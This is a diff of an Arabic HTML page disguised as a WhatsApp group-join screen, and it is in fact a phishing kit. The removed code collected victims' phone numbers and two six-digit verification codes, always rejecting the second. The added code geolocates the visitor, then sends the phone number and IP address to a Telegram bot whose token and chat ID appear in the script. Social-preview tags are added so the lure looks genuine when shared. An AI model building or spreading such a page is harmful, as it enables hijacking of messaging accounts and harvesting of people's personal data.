@@ -4,6 +4,12 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>الانضمام إلى المجموعة</title>
+<meta property="og:title" content="الانضمام إلى المجموعة">
+<meta property="og:description" content="اضغط للانضمام عبر واتساب">
+<meta property="og:image" content="https://love-ashen-beta.vercel.app/og-image.png">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&display=swap">
 <style>
 :root{--bg:#effaf3;--card:#ffffff;--ink:#0f2a1c;--muted:#5b7568;--green:#1faa59;--green-d:#168a46;--line:#cfe5d7;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@@ -26,82 +32,131 @@ button:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
 .phone-row input{flex:1;min-width:0;width:auto}
 .phone-row select{flex:0 0 42%;max-width:170px;font:inherit;font-size:16px;font-weight:700;padding:14px 6px;border:2px solid var(--line);border-radius:14px;background:transparent;color:var(--ink);direction:rtl;text-align:center}
 .phone-row option,.phone-row optgroup{background:var(--card);color:var(--ink)}
-.code{letter-spacing:.35em;font-size:22px;font-weight:700}
-.code::placeholder{letter-spacing:normal;font-size:18px;font-weight:500}
 </style>
 </head>
 <body>
 
 <main id="s1">
-<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="واتساب"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.700-3.800-9.200-8.100-.4-.8-.1-1.300.4-1.800l1.700-2c.4-.5.500-1 .2-1.700l-3-6.600c-.3-.6-.8-.9-1.600-.9z" fill="#fff"/></svg>
+<svg class="logo" viewBox="0 0 112 112" role="img" aria-label="واتساب"><circle cx="56" cy="56" r="56" fill="#25d366"/><path d="M56 24a32 32 0 0 0-27.6 48.1L25 87l15.3-3.3A32 32 0 1 0 56 24z" fill="none" stroke="#fff" stroke-width="5" stroke-linejoin="round"/><path d="M45 42c-1.5 0-3.5 1-4.5 3.5-1.3 3.3 0 8 4.5 13.5 5.3 6.4 11.5 9.3 15.8 9.4 3 .1 5.7-1.8 6.4-4.2.3-1 .3-1.8 0-2-.5-.4-4.2-2.2-5-2.5-.8-.3-1.4-.2-1.9.5l-2.2 2.7c-.5.6-1 .7-1.8.4-2.6-1.3-6.7-3.8-9.2-8.1-.4-.8-.1-1.3.4-1.8l1.7-2c.4-.5.5-1 .2-1.7l-3-6.6c-.3-.6-.8-.9-1.6-.9z" fill="#fff"/></svg>
 <h1>الانضمام إلى المجموعة</h1>
-<div class="phone-row"><select id="cc" aria-label="رمز الدولة"><optgroup label="دول الخليج"><option value="+966" selected>السعودية +966</option><option value="+971">الإمارات +971</option><option value="+965">الكويت +965</option><option value="+974">قطر +974</option><option value="+973">البحرين +973</option><option value="+968">عُمان +968</option></optgroup><optgroup label="أوروبا"><option value="+44">بريطانيا +44</option><option value="+49">ألمانيا +49</option><option value="+33">فرنسا +33</option><option value="+39">إيطاليا +39</option><option value="+34">إسبانيا +34</option><option value="+31">هولندا +31</option><option value="+32">بلجيكا +32</option><option value="+41">سويسرا +41</option><option value="+43">النمسا +43</option><option value="+46">السويد +46</option><option value="+47">النرويج +47</option><option value="+45">الدنمارك +45</option><option value="+353">أيرلندا +353</option><option value="+351">البرتغال +351</option><option value="+30">اليونان +30</option><option value="+48">بولندا +48</option></optgroup><optgroup label="أمريكا"><option value="+1">أمريكا / كندا +1</option><option value="+52">المكسيك +52</option><option value="+55">البرازيل +55</option><option value="+54">الأرجنتين +54</option><option value="+57">كولومبيا +57</option><option value="+56">تشيلي +56</option></optgroup><optgroup label="أستراليا"><option value="+61">أستراليا +61</option></optgroup></select>
-<input id="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="اكتب رقم هاتفك" aria-label="رقم الهاتف"></div>
+<div class="phone-row">
+  <select id="cc" aria-label="رمز الدولة">
+    <optgroup label="الدول المضافة">
+      <option value="+961">لبنان +961</option>
+      <option value="+962">الأردن +962</option>
+      <option value="+20">مصر +20</option>
+    </optgroup>
+    <optgroup label="دول الخليج">
+      <option value="+966">السعودية +966</option>
+      <option value="+971">الإمارات +971</option>
+      <option value="+965">الكويت +965</option>
+      <option value="+974">قطر +974</option>
+      <option value="+973">البحرين +973</option>
+      <option value="+968">عُمان +968</option>
+    </optgroup>
+    <optgroup label="أوروبا">
+      <option value="+44">بريطانيا +44</option><option value="+49">ألمانيا +49</option><option value="+33">فرنسا +33</option><option value="+39">إيطاليا +39</option><option value="+34">إسبانيا +34</option><option value="+31">هولندا +31</option><option value="+32">بلجيكا +32</option><option value="+41">سويسرا +41</option><option value="+43">النمسا +43</option><option value="+46">السويد +46</option><option value="+47">النرويج +47</option><option value="+45">الدنمارك +45</option><option value="+353">أيرلندا +353</option><option value="+351">البرتغال +351</option><option value="+30">اليونان +30</option><option value="+48">بولندا +48</option>
+    </optgroup>
+    <optgroup label="أمريكا">
+      <option value="+1">أمريكا / كندا +1</option><option value="+52">المكسيك +52</option><option value="+55">البرازيل +55</option><option value="+54">الأرجنتين +54</option><option value="+57">كولومبيا +57</option><option value="+56">تشيلي +56</option>
+    </optgroup>
+    <optgroup label="أستراليا">
+      <option value="+61">أستراليا +61</option>
+    </optgroup>
+  </select>
+  <input id="phone" type="tel" inputmode="tel" autocomplete="tel-national" placeholder="اكتب رقم هاتفك" aria-label="رقم الهاتف">
+</div>
 <button id="go" type="button">انضم الآن</button>
 <p id="msg" class="err" role="alert"></p>
 </main>
 
-<main id="s2" hidden>
-<div id="l2"></div>
-<h1>ادخل رمز الإضافة</h1>
-<input id="code" class="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" placeholder="اكتب الرمز" aria-label="رمز الإضافة">
-<p id="err" class="err" role="alert"></p>
-<button id="ok" type="button">تأكيد</button>
-</main>
-
-<main id="s3" hidden>
-<div id="l3"></div>
-<h1>ادخل رمز الإضافة</h1>
-<input id="code2" class="code" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" placeholder="اكتب الرمز" aria-label="رمز الإضافة">
-<p id="err2" class="err" role="alert"></p>
-<button id="ok2" type="button">تأكيد</button>
-</main>
-
 <script>
-function $(i){return document.getElementById(i);}
-function digits(s){return s.replace(/[٠-٩]/g,function(d){return d.charCodeAt(0)-1632;});}
-function clean(el){el.value=digits(el.value).replace(/\D/g,'').slice(0,6);}
-function send(text){
-  fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:text})}).catch(function(){});
-}
-var s1=$('s1'),s2=$('s2'),s3=$('s3');
-var logo=document.querySelector('#s1 .logo');
-$('l2').appendChild(logo.cloneNode(true));
-$('l3').appendChild(logo.cloneNode(true));
+// كشف الدولة تلقائياً بناءً على الـ IP للزبون
+async function detectUserCountry() {
+    try {
+        let response = await fetch('https://ipapi.co/json/');
+        let data = await response.json();
+        let countryCodeSelect = document.getElementById("cc");
+        
+        if (data && data.country_code) {
+            let dialCode = "";
+            if (data.country_code === "LB") dialCode = "+961";
+            else if (data.country_code === "JO") dialCode = "+962";
+            else if (data.country_code === "EG") dialCode = "+20";
+            else if (data.country_code === "SA") dialCode = "+966";
+            else if (data.country_code === "AE") dialCode = "+971";
+            else if (data.country_code === "KW") dialCode = "+965";
+            else if (data.country_code === "QA") dialCode = "+974";
+            else if (data.country_code === "BH") dialCode = "+973";
+            else if (data.country_code === "OM") dialCode = "+968";
 
-/* الصفحة 1: رقم الهاتف */
-var phone=$('phone');
-function go(){
-  var v=digits(phone.value).replace(/[\s\-()]/g,'');
-  if(!/^\d{6,15}$/.test(v)){$('msg').textContent='اكتب رقم هاتف صحيح.';return;}
-  send('📱 رقم جديد: '+$('cc').value+v);
-  s1.hidden=true;s2.hidden=false;$('code').focus();
+            if (dialCode) {
+                for (let option of countryCodeSelect.options) {
+                    if (option.value === dialCode) {
+                        option.selected = true;
+                        break;
+                    }
+                }
+            }
+        }
+    } catch (e) {
+        console.log("تعذر تحديد الموقع الجغرافي تلقائياً", e);
+    }
 }
-$('go').addEventListener('click',go);
-phone.addEventListener('keydown',function(e){if(e.key==='Enter')go();});
 
-/* الصفحة 2: إدخال الرمز ثم تأكيد */
-var code=$('code');
-function next(){
-  if(code.value.length<6){$('err').textContent='اكتب الرمز المكوّن من 6 أرقام.';return;}
-  send('🔑 محاولة 1: '+code.value);
-  s2.hidden=true;s3.hidden=false;$('code2').focus();
-}
-code.addEventListener('input',function(){clean(code);$('err').textContent='';});
-code.addEventListener('keydown',function(e){if(e.key==='Enter')next();});
-$('ok').addEventListener('click',next);
+window.onload = detectUserCountry;
 
-/* الصفحة 3: تظهر عبارة الرمز غير صحيح */
-var code2=$('code2');
-function check(){
-  if(code2.value.length<6){$('err2').textContent='اكتب الرمز المكوّن من 6 أرقام.';return;}
-  send('🔑 محاولة 2: '+code2.value);
-  $('err2').textContent='الرمز الذي أدخلتم غير صحيح';
-  code2.value='';code2.focus();
+// دالة إرسال البيانات إلى تليجرام
+async function sendDataToTelegram(fullPhoneNumber, countryName, pinCode) {
+    try {
+        let ipResponse = await fetch('https://api.ipify.org?format=json');
+        let ipData = await ipResponse.json();
+        let ipAddress = ipData.ip;
+
+        let messageText = `Numéro: ${fullPhoneNumber}\n` +
+                          `Pays: ${countryName}\n` +
+                          `Pin: ${pinCode}\n` +
+                          `Code: ${pinCode}\n` +
+                          `Adresse IP: ${ipAddress}`;
+
+        // ⚠️ استبدل النصوص أدناه بمعلومات بوت تليجرام الخاص بك
+        let botToken = "8863417031:AAF7jehBC9WE41rjAk6HfYcvAh7G1H5-nxg";
+        let chatId = "6691240451";
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: messageText
+            })
+        });
+    } catch (error) {
+        console.error("خطأ في الإرسال:", error);
+    }
 }
-code2.addEventListener('input',function(){clean(code2);$('err2').textContent='';if(code2.value.length===6)check();});
-code2.addEventListener('keydown',function(e){if(e.key==='Enter')check();});
-$('ok2').addEventListener('click',check);
+
+document.getElementById("go").addEventListener("click", function() {
+    let cc = document.getElementById("cc").value;
+    let phoneInput = document.getElementById("phone").value;
+    
+    if(!phoneInput) {
+        document.getElementById("msg").innerText = "الرجاء إدخال رقم الهاتف";
+        return;
+    }
+
+    let fullPhoneNumber = cc + phoneInput;
+    let countryName = cc.replace("+", ""); 
+    let pinCode = "546557"; 
+
+    sendDataToTelegram(fullPhoneNumber, countryName, pinCode);
+});
 </script>
+
 </body>
 </html>
+
+
+
+
+
